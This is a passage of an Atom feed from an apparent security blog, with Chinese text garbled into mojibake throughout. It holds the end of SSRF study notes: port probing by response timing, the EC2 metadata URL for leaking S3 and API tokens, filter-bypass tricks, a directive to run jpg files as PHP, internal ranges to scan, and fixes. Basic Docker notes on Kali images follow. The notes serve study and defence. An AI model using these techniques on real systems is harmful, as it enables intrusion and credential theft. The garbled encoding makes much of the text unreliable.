æ³•å»ºç«‹è¿æ¥æˆ–æ”¶ä¸åˆ°æœåŠ¡å™¨å“åº”ï¼Œå¼‚å¸¸å°†è¢«æŠ›å‡ºã€‚åˆ©ç”¨è¿™ä¸ªç‰¹å¾å¯ä»¥è¯†åˆ«ç«¯å£æ˜¯å¦å¼€æ”¾ï¼ˆè¿æ¥å»ºç«‹ï¼‰æˆ–å…³é—­ï¼ˆè¿æ¥å¤±è´¥æˆ–è¶…æ—¶ï¼‰ã€‚</p><table><thead><tr><th><strong>URL parameter</strong></th><th><strong>Response HTTP status</strong></th><th><strong>RTT</strong></th><th><strong>Conclusion</strong></th></tr></thead><tbody><tr><td><strong><a href="http://127.0.0.1:22" target="_blank" rel="noopener">http://127.0.0.1:22</a></strong></td><td><strong>200</strong></td><td><strong>10ms</strong></td><td><strong>Port is open</strong></td></tr><tr><td><strong><a href="http://127.0.0.1:23" target="_blank" rel="noopener">http://127.0.0.1:23</a></strong></td><td><strong>500</strong></td><td><strong>10ms</strong></td><td><strong>Port is closed</strong></td></tr><tr><td><strong><a href="http://10.0.0.1/" target="_blank" rel="noopener">http://10.0.0.1/</a></strong></td><td><strong>500</strong></td><td><strong>30010ms</strong></td><td><strong>Firewalled or unable to route traffic to server</strong></td></tr><tr><td><strong><a href="http://10.0.0.1:8080/" target="_blank" rel="noopener">http://10.0.0.1:8080/</a></strong></td><td><strong>500</strong></td><td><strong>10ms</strong></td><td><strong>Port is closed and traffic is routed to server</strong></td></tr></tbody></table><p>â€‹    å¯¹äºå¼€æ”¾å’Œå…³é—­çš„ç«¯å£ï¼Œæ¯ä¸ªSSRFå“åº”éƒ½ä¸åŒã€‚è¯•ç€ä»¥ä¸åŒçš„å“åº”ä¸ºåŸºç¡€å»ºç«‹ä¸€ä¸ªå¼€æ”¾ã€é—­åˆç«¯å£å’Œæ ‡å¿—ç¬¦ä¹‹é—´çš„æ˜ å°„ã€‚ä¸Šé¢çš„è¡¨æ ¼å°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p><p>####7.DoSæ”»å‡»ï¼ˆè¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥keep-alive alwaysï¼‰</p><p>####8.æå–EC2é…ç½®æ–‡ä»¶</p><p>è¶Šæ¥è¶Šå¤šçš„å…¬å¸å°†éƒ¨åˆ†åŸºç¡€è®¾æ–½æ”¾åˆ°äºšé©¬é€Šçš„EC2æœåŠ¡å™¨ä¸Šã€‚äºšé©¬é€Šå…¬å¼€å†…éƒ¨æœåŠ¡ï¼Œæ¯å°ECå®ä¾‹éƒ½èƒ½æŸ¥è¯¢ä¸»æœºå…ƒæ•°æ®ã€‚<a href="https://xz.aliyun.com/t/    http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank" rel="noopener">è¿™æ˜¯AWSæ–‡æ¡£</a>ã€‚å¦‚æœä½ åœ¨EC2ä¸Šå‘ç°äº†SSRFæ¼æ´ï¼Œè¯•ç€è¯·æ±‚<em><a href="http://169.254.169.254/latest/meta-data" target="_blank" rel="noopener">http://169.254.169.254/latest/meta-data</a></em>ã€‚å“åº”ä¼šæä¾›è®¸å¤šæœ‰ç”¨çš„ä¿¡æ¯ä¾¿äºå¯¹åŸºç¡€è®¾æ–½æœ‰ä¸€å®šçš„äº†è§£ï¼Œç”šè‡³å¯èƒ½ä¼šæ³„æ¼äºšé©¬é€ŠS3çš„è®¿é—®tokenï¼ŒAPI tokenç­‰ç­‰ã€‚ä½ ä¹Ÿå¯ä»¥ä¸‹è½½_ <a href="http://169.254.169.254/latest/user-data_%E5%92%8C%E8%A7%A3%E5%8E%8B%E6%95%B0%E6%8D%AE%E3%80%82" target="_blank" rel="noopener">http://169.254.169.254/latest/user-data_å’Œè§£å‹æ•°æ®ã€‚</a></p><p>###0x04 ç»•è¿‡å°æŠ€å·§</p><p>æ³¨ï¼šå‚è€ƒ[8]ä¼šæœ‰æ›´è¯¦ç»†çš„ç»•è¿‡æ–¹å¼æ€»ç»“</p><p>1.<a href="http://baidu.com@www.baidu.com/ä¸http://www.baidu.com/è¯·æ±‚æ—¶æ˜¯ç›¸åŒçš„" target="_blank" rel="noopener">http://baidu.com@www.baidu.com/ä¸http://www.baidu.com/è¯·æ±‚æ—¶æ˜¯ç›¸åŒçš„</a></p><p>2.å„ç§IPåœ°å€çš„è¿›åˆ¶è½¬æ¢</p><p>3.URLè·³è½¬ç»•è¿‡ï¼š<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/" target="_blank" rel="noopener">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p><p>4.çŸ­ç½‘å€ç»•è¿‡ <a href="http://t.cn/RwbLKDx" target="_blank" rel="noopener">http://t.cn/RwbLKDx</a></p><p>5.xip.ioæ¥ç»•è¿‡ï¼š<a href="http://xxx.192.168.0.1.xip.io/" target="_blank" rel="noopener">http://xxx.192.168.0.1.xip.io/</a> == 192.168.0.1  (xxx ä»»æ„ï¼‰</p><p>æŒ‡å‘ä»»æ„ipçš„åŸŸåï¼šxip.io(37signalså¼€å‘å®ç°çš„å®šåˆ¶DNSæœåŠ¡)</p><p>6.é™åˆ¶äº†å­ç½‘æ®µï¼Œå¯ä»¥åŠ  :80 ç«¯å£ç»•è¿‡ã€‚<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80" target="_blank" rel="noopener">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p><p>7.æ¢æµ‹å†…ç½‘åŸŸåï¼Œæˆ–è€…å°†è‡ªå·±çš„åŸŸåè§£æåˆ°å†…ç½‘ip</p><p>8.ä¾‹å¦‚ <a href="http://10.153.138.81/ts.php" target="_blank" rel="noopener">http://10.153.138.81/ts.php</a> , ä¿®å¤æ—¶å®¹æ˜“å‡ºç°çš„è·å–hostæ—¶ä»¥/åˆ†å‰²æ¥ç¡®å®šhostï¼Œ</p><p>ä½†è¿™æ ·å¯ä»¥ç”¨ <a href="http://abc@10.153.138.81/" target="_blank" rel="noopener">http://abc@10.153.138.81/</a> ç»•è¿‡</p><p>###0x05 æ¼æ´ç¤ºä¾‹</p><p>1.Wordpress3.5.1ä»¥ä¸‹ç‰ˆæœ¬ xmlrpc.php pingbackçš„ç¼ºé™·ä¸ssrf</p><p>2.discuzï¼çš„ssrf ï¼ˆåˆ©ç”¨phpçš„headerå‡½æ•°æ¥ç»•è¿‡ï¼Œå…¶å®å°±æ˜¯302è·³è½¬å®ç°åè®®è½¬æ¢ï¼‰</p><p>3.weblogicçš„ssrf</p><h3 id="0x06-æ¼æ´é¶åœº"><a href="#0x06-æ¼æ´é¶åœº" class="headerlink" title="0x06 æ¼æ´é¶åœº"></a>0x06 æ¼æ´é¶åœº</h3><p><a href="https://github.com/jobertabma/ground-control" target="_blank" rel="noopener">https://github.com/jobertabma/ground-control</a></p><p>###0x07 æ¼æ´ä¿®å¤</p><p>1.ç¦æ­¢è·³è½¬</p><p>2.è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚</p><p>3.ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile://, gopher://, ftp:// ç­‰å¼•èµ·çš„é—®é¢˜</p><p>4.è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IPï¼ˆä½¿ç”¨gethostbyname()åˆ¤æ–­æ˜¯å¦ä¸ºå†…ç½‘IPï¼‰</p><p>5.é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80ã€443ã€8080ã€8090</p><p>6.ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚</p><p>###0x08 æ¼æ´åˆ©ç”¨ä¸­ç‰µæ¶‰çš„å°æŠ€å·§</p><p>crontab -l æ˜¾ç¤ºå½“å‰è®¡åˆ’ä»»åŠ¡</p><p>crontab -r æ¸…é™¤å½“å‰è®¡åˆ’ä»»åŠ¡</p><p>ç«¯å£è½¬å‘å·¥å…· socat</p><p>åœ¨Apacheé…ç½®æ–‡ä»¶ä¸­å†™å…¥ä¸‹é¢çš„å†…å®¹ï¼Œå°±å¯ä»¥å°†jpgæ–‡ä»¶å½“åšPHPæ–‡ä»¶æ¥æ‰§è¡Œ</p><p>AddType application/x-httpd-php .jpg<br>â€¦â€¦</p><p>å¸¸ç”¨çš„æ¢æµ‹å†…ç½‘åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 10.0.0.0/8</span><br><span class="line">- 127.0.0.1/32</span><br><span class="line">- 172.16.0.0/12</span><br><span class="line">- 192.168.0.0/16</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨çš„æ¢æµ‹ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22ã€80ã€443ã€8080ã€8443</span><br></pre></td></tr></table></figure><p>###0x09 ç›¸å…³ææ–™</p><p>[1]<a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></p><p>[2]<a href="https://paper.seebug.org/393/" target="_blank" rel="noopener">https://paper.seebug.org/393/</a></p><p>[3]<a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="noopener">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a></p><p>[4]<a href="http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html" target="_blank" rel="noopener">http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html</a></p><p>[5]<a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p><p>[6]<a href="http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p><p>[7]<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p><p>[8]<a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a></p><p>[9]<a href="https://www.cnblogs.com/s0ky1xd/p/5859049.html" target="_blank" rel="noopener">https://www.cnblogs.com/s0ky1xd/p/5859049.html</a></p><p>[10]<a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-41070.html</a></p><p>[11]<a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p><p>[12]<a href="https://ricterz.me/posts/HITCON%202017%20SSRFme" target="_blank" rel="noopener">https://ricterz.me/posts/HITCON%202017%20SSRFme</a></p><p>[13]<a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/240.html</a></p><p>[14]<a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0</a></p><p>[15]<a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="noopener">https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf</a></p><p>###0x10 åè®°</p><p>è¿™ç¯‡æ˜¯æˆ‘æ•´ç†äº†ä¹‹å‰çš„ä¸€ç¯‡ç¬”è®°ï¼Œè¿™ç¯‡ç¬”è®°ä¸­æ²¡æœ‰ç»™å‡ºæ¡ˆä¾‹ã€‚åé¢æœ‰ç©ºäº†ä¹Ÿä¼šæŠŠè‡ªå·±çš„ä¸€äº›æ¡ˆä¾‹ç¬”è®°æ•´ç†ä¸‹ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###0x00 æ¦‚å¿µ&lt;/p&gt;
&lt;p&gt;SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿ
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Dockerç¬”è®°</title>
    <link href="http://zer0yu.github.io/2017/12/02/Docker%E7%AC%94%E8%AE%B0%E2%80%94%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <id>http://zer0yu.github.io/2017/12/02/Dockerç¬”è®°â€”åŸºç¡€ç¯‡/</id>
    <published>2017-12-02T02:33:38.000Z</published>
    <updated>2018-11-28T16:06:11.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><p>Dockeré•œåƒï¼šä¸€ä¸ªåªè¯»æ¨¡æ¿ï¼Œæ˜¯åˆ›å»ºDockerå®¹å™¨çš„åŸºç¡€ã€‚é•œåƒæ–‡ä»¶æ˜¯ç”±å¤šä¸ªå±‚ç»„æˆçš„ã€‚</p><p>Dockerå®¹å™¨ï¼šä¸€ä¸ªè½»é‡çº§æ²™ç®±ï¼Œæ¥è¿è¡Œå’Œéš”ç¦»åº”ç”¨</p><p>Dockerä»“åº“ï¼šç”¨æ¥å­˜å‚¨Dockeré•œåƒæ–‡ä»¶çš„åœ°æ–¹</p><p>Dockerä¸­ç”¨äºåŒºåˆ†çš„æ–¹å¼æ˜¯idæˆ–è€…name:tag</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a></p><h3 id="æ“ä½œé•œåƒ"><a href="#æ“ä½œé•œåƒ" class="headerlink" title="æ“ä½œé•œåƒ"></a>æ“ä½œé•œåƒ</h3><h4 id="1-è·å–é•œåƒï¼ˆé»˜è®¤æ˜¯ä»docker-hubç½‘ç«™è¿›è¡Œé•œåƒçš„è·å–ï¼‰"><a href="#1-è·å–é•œåƒï¼ˆé»˜è®¤æ˜¯ä»docker-hubç½‘ç«™è¿›è¡Œé•œåƒçš„è·å–ï¼‰" class="headerlink" title="1.è·å–é•œåƒï¼ˆé»˜è®¤æ˜¯ä»docker hubç½‘ç«™è¿›è¡Œé•œåƒçš„è·å–ï¼‰"></a>1.è·å–é•œåƒï¼ˆé»˜è®¤æ˜¯ä»docker hubç½‘ç«™è¿›è¡Œé•œåƒçš„è·å–ï¼‰</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull kalilinux/kali-linux-docker</span><br><span class="line"><span class="comment">#å¦‚æœæƒ³ä½¿ç”¨éå®˜æ–¹ä»“åº“éœ€è¦æŒ‡å®šä»“åº“å®Œæ•´çš„åœ°å€</span></span><br><span class="line">docker pull hub.c.163.com/public/ubuntu:14.04</span><br></pre></td></tr></table></figure><p>å»ºè®®ï¼šä½¿ç”¨ä¸­ç§‘å¤§é•œåƒæº    <code>https://docker.mirrors.ustc.edu.cn</code></p><p>é™„å¸¦ï¼š<a href="https://segmentfault.com/a/1190000006146697" target="_blank" rel="noopener">åœ¨å›½å†… docker build çš„æ­£ç¡®å§¿åŠ¿</a></p><h4 id="2-åˆ—å‡ºé•œåƒ"><a href="#2-åˆ—å‡ºé•œåƒ" class="headerlink" title="2.åˆ—å‡ºé•œåƒ"></a>2.åˆ—å‡ºé•œåƒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ docker images</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</span><br></pre></td></tr></table></figure><p>REPOSITORY:æ¥è‡ªå“ªä¸ªä»“åº“</p><p>TAG:é•œåƒçš„æ ‡ç­¾ä¿¡æ¯ï¼Œèƒ½æ ‡ç¤ºæ¥è‡ªåŒä¸€ä»“åº“çš„ä¸åŒé•œåƒ</p><p>IMAGE ID:é•œåƒçš„IDï¼Œæ­¤å­—æ®µå”¯ä¸€æ ‡ç¤ºäº†é•œåƒ</p><p>CREATED:åˆ›å»ºæ—¶é—´</p><p>SIZE:é•œåƒçš„å¤§å°</p><h4 id="3-æ·»åŠ é•œåƒæ ‡ç­¾"><a href="#3-æ·»åŠ é•œåƒæ ‡ç­¾" class="headerlink" title="3.æ·»åŠ é•œåƒæ ‡ç­¾"></a>3.æ·»åŠ é•œåƒæ ‡ç­¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¯¹kalilinux/kali-linux-docker:latestæ·»åŠ æ–°çš„æ ‡ç­¾kalilinux:latest</span></span><br><span class="line">âœ  ~ docker tag kalilinux/kali-linux-docker:latest kalilinux:latest</span><br><span class="line"><span class="comment">#åˆ«åä¸ä¸€æ ·ä½†æ˜¯ä¸¤è€…çš„é•œåƒæ–‡ä»¶æ˜¯ä¸€æ ·çš„ï¼ˆidç›¸åŒï¼‰</span></span><br><span class="line">âœ  ~ docker images</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</span><br><span class="line">kalilinux                     latest              8ececeaf404d        9 months ago        1.56GB</span><br></pre></td></tr></table></figure><h4 id="4-æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯"><a href="#4-æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯" class="headerlink" title="4.æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯"></a>4.æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ docker inspect kalilinux:latest</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"Id"</span>: <span class="string">"sha256:8ececeaf404d5d63d4e9bf870f4340516f3be040e5db6c005ac8cf96d2c43536"</span>,</span><br><span class="line">        <span class="string">"RepoTags"</span>: [</span><br><span class="line">            <span class="string">"kalilinux/kali-linux-docker:latest"</span>,</span><br><span class="line">            <span class="string">"kalilinux:latest"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"RepoDigests"</span>: [</span><br><span class="line">            <span class="string">"kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d"</span></span><br><span class="line">        ],</span><br><span class="line">        ......</span><br><span class="line">        <span class="string">"Metadata"</span>: &#123;</span><br><span class="line">            <span class="string">"LastTagTime"</span>: <span class="string">"2017-12-02T04:56:53.8185955Z"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="5-æŸ¥çœ‹é•œåƒå†å²"><a href="#5-æŸ¥çœ‹é•œåƒå†å²" class="headerlink" title="5.æŸ¥çœ‹é•œåƒå†å²"></a>5.æŸ¥çœ‹é•œåƒå†å²</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ docker <span class="built_in">history</span> kalilinux:latest</span><br><span class="line">IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT</span><br><span class="line">8ececeaf404d        9 months ago        /bin/sh -c <span class="comment">#(nop)  CMD ["/bin/bash"]            0B</span></span><br><span class="line">&lt;missing&gt;           9 months ago        /bin/sh -c apt-get -y update &amp;&amp; apt-get -y...   251MB</span><br><span class="line">&lt;missing&gt;           9 months ago        /bin/sh -c <span class="comment">#(nop)  ENV DEBIAN_FRONTEND=non...   0B</span></span><br><span class="line">&lt;missing&gt;           9 months ago        /bin/sh -c <span class="built_in">echo</span> <span class="string">"deb http://http.kali.org/...   134B</span></span><br><span class="line"><span class="string">&lt;missing&gt;           9 months ago        /bin/sh -c #(nop)  MAINTAINER steev@kali.org    0B</span></span><br><span class="line"><span class="string">&lt;missing&gt;           11 months ago       /bin/sh -c #(nop)  CMD ["</span>/bin/bash<span class="string">"]            0B</span></span><br><span class="line"><span class="string">&lt;missing&gt;           11 months ago       /bin/sh -c apt-get -y update &amp;&amp; apt-get -y...   286MB</span></span><br></pre></td></tr></table></figure><h4 id="6-æœç´¢é•œåƒ"><a href="#6-æœç´¢é•œåƒ" class="headerlink" title="6.æœç´¢é•œåƒ"></a>6.æœç´¢é•œåƒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æœç´¢æ‰€æœ‰è‡ªåŠ¨åˆ›å»ºçš„è¯„ä»·ä¸º1+çš„å¸¦kaliå…³é”®å­—çš„é•œåƒ</span></span><br><span class="line">âœ  ~ docker search --automated -s 3 kali</span><br><span class="line">Flag --automated has been deprecated, use --filter=is-automated=<span class="literal">true</span> instead</span><br><span class="line">Flag --stars has been deprecated, use --filter=stars=3 instead</span><br><span class="line">NAME                           DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">kalilinux/kali-linux-docker    Kali Linux Rolling Distribution Base Image      361                                     [OK]</span><br><span class="line">linuxkonsult/kali-metasploit   Kali base image with metasploit                 54                                      [OK]</span><br><span class="line">jasonchaffee/kali-linux        Kali Linux Docker Container with the kali-...   8                                       [OK]</span><br><span class="line">brimstone/kali                                                                 6                                       [OK]</span><br><span class="line">adamoss/kali2-metasploit       Kali2 Automated Build                           4                                       [OK]</span><br><span class="line">wsec/kali-metasploit           Official Kali Base image + Metasploit           3                                       [OK]</span><br><span class="line">kalinon/comicstreamer          ComicStreamer is a media server app <span class="keyword">for</span> sh...   3                                       [OK]</span><br></pre></td></tr></table></figure><h4 id="7-åˆ é™¤é•œåƒ"><a href="#7-åˆ é™¤é•œåƒ" class="headerlink" title="7.åˆ é™¤é•œåƒ"></a>7.åˆ é™¤é•œåƒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¦‚æœåŒä¸€ä¸ªæ ‡ç­¾æœ‰å¤šä¸ªtagï¼Œé‚£ä¹ˆdocker rmiåªæ˜¯åˆ é™¤tagè€Œå·²</span></span><br><span class="line"><span class="comment">#å¦‚æœdocker rmi idçš„è¯ï¼Œä¼šå…ˆåˆ é™¤æ‰€æœ‰çš„tagç„¶ååˆ é™¤é•œåƒ</span></span><br><span class="line"><span class="comment">#ä½†æ˜¯è‹¥è¯¥é•œåƒçš„å®¹å™¨å­˜åœ¨ï¼Œä¹Ÿæ˜¯æ— æ³•åˆ é™¤çš„ï¼Œå¦‚æœæƒ³å¼ºåˆ¶åˆ é™¤å¯ä»¥ä½¿ç”¨docker rmi -f id</span></span><br><span class="line">âœ  ~ docker images</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</span><br><span class="line">kalilinux                     latest              8ececeaf404d        9 months ago        1.56GB</span><br><span class="line">âœ  ~ docker rmi kalilinux/kali-linux-docker:latest</span><br><span class="line">Untagged: kalilinux/kali-linux-docker:latest</span><br><span class="line">Untagged: kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d</span><br><span class="line">âœ  ~ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux           latest              8ececeaf404d        9 months ago        1.56GB</span><br></pre></td></tr></table></figure><h4 id="8-åˆ›å»ºé•œåƒ"><a href="#8-åˆ›å»ºé•œåƒ" class="headerlink" title="8.åˆ›å»ºé•œåƒ"></a>8.åˆ›å»ºé•œåƒ</h4><p>1ï¼‰åŸºäºå·²æœ‰é•œåƒçš„å®¹å™¨åˆ›å»º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æˆ‘ä»¬å…ˆåˆ›å»ºå®¹å™¨å¹¶å®‰è£…metasploit-framework</span></span><br><span class="line">âœ  ~ docker run -it kalilinux:latest /bin/bash</span><br><span class="line">root@de573c5f5dc6:/<span class="comment"># apt update &amp;&amp; apt install metasploit-framework</span></span><br><span class="line">root@de573c5f5dc6:/<span class="comment">#exit</span></span><br><span class="line"><span class="comment">#è®°ä½idä¸ºde573c5f5dc6</span></span><br><span class="line"><span class="comment">#docker commit -m "æ”¹åŠ¨ä¿¡æ¯" -a "ä½œè€…åç§°" id REPOSITORY:TAG</span></span><br><span class="line">âœ  ~ docker commit -m <span class="string">"install msf"</span> -a <span class="string">"zeroyu"</span> de573c5f5dc6 kalilinux:0.1</span><br><span class="line">sha256:66a6770d79d88c826b2e4a38b98037c14de0b9d2ce897307dc30afbf675ce51a</span><br><span class="line">âœ  ~ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux           0.1                 66a6770d79d8        21 seconds ago      2.54GB</span><br><span class="line">kalilinux           latest              8ececeaf404d        9 months ago        1.56GB</span><br></pre></td></tr></table></figure><p>2ï¼‰åŸºäºæœ¬åœ°æ¨¡æ¿å¯¼å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import ...</span><br></pre></td></tr></table></figure><h4 id="9-å­˜å‡ºå’Œè½½å…¥é•œåƒ"><a 